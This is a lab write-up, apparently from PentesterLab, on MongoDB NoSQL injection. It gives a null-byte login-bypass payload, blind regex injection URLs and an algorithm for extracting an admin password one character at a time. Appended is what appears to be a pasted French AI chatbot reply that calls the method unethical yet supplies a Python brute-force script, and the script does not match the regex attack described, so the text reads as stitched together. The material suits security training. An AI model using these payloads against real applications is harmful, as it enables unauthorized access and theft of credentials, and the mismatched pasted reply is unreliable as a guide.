# MongoDB

**INJECTION WITH A NULL BYTE**

This example is the MongoDB version of the (in)famous ' or 1=1 --.

If you remember what you saw previously, you know that you will need two things to bypass this login:

* `An always true condition.`
* `A way to correctly terminate the NoSQL query.`

First, by reading MongoDB documentation you can find that the SQL or 1=1 translates to || 1==1 (note the double =).

Then by poking around, you can see that a NULL BYTE will prevent MongoDB from using the rest of the query.

In some cases, you can also use the comments // or \<!-- to comment out the end of the query.

`?username=admin'||'1==1'%00&password=test`

In this example, we will try to retrieve more information from the NoSQL database.

Using a bit of guess work (or previous knowledge of the application), we can deduce that there is probably a password field.

We can play around to confirm that suspicion:

```
if we access [/?search=admin'%20%26%26%20this.password.match(/.\\*/)%00](): we can see a result.
if we access [/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00](): we cannot see a result.
if we access [/?search=admin'%20%26%26%20this.passwordzz.match(/.\\*/)%00](): we get an error message (since the field passwordzz does not exist).
```

Now, we have a way to perform a blind injection since we have two states:

```
No result when the regular expression does not match something: false state.
One result when the regular expression matches something: true state.
```

Using this knowledge, we can script the exploitation to retrieve the admin password.

We will first ensure that the matching is done correctly by using: ^ and $ to make sure we do not match characters in the middle of the string (otherwise iterating will be far harder).

The algorithm looks like:

```
test if password match /^a._$/ if it matches test without the wildcard ._(to check if it's the full password). Then move to the next letter if it does not match.
test if password match /^b._$/ if it matches test without the wildcard ._. Then move to the next letter if it does not match.
```

For example, if the password is aab, the following test will be performed:

```
/^a.\\*$/ that will return true.
/^a$/ that will return false.
/^aa.\\*$/ that will return true.
/^aa$/ that will return false.
/^aaa.\\*$/ that will return false.
/^aab.\\*$/ that will return true.
/^aab$/ that will return true. The password has been found.
```

With these details, you should be able to retrieve the password for the user admin. The password is the key to solve this exercises, so it should have the following format:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX, where X can be \[0-9a-f].\
In case the password field does not exist for some records (since it's a NoSQL database), it's always a good idea to ensure its presence by using ... && this.password && this.password.match(... instead of just using ... && this.password.match(....

admin' %26%26 this.password.match(/.\\$\*/)%00

Je comprends maintenant que vous voulez de l'aide pour un exercice de formation sur pentesterlab. Je suis désolé pour la confusion. Il est important de noter que l'utilisation d'une technique d'essais et erreurs pour trouver des informations sensibles comme une clé de licence n'est pas considérée comme une pratique éthique et n'est pas recommandée dans la vie réelle.

Voici un exemple de script en Python qui pourrait être utilisé pour tester tous les caractères possibles pour la clé de licence en utilisant Burp Suite:

```
Copy codeimport requests

# Define the target URL and the parameter name
url = "http://example.com/check_license.php"
param = "license_key"

# Define the possible characters for the key
charset = "0123456789abcdef"

# Start with an empty key
key = ""

# Try adding one character at a time to the key and checking the response
while True:
    for c in charset:
        payload = key + c
        data = {param: payload}
        r = requests.post(url, data=data)
        
        # Check the response for a match
        if "valid key" in r.text:
            key += c
            print("Found character: " + c)
            break
    else:
        # If no match is found, the key is complete
        break

print("Found key: " + key)
```
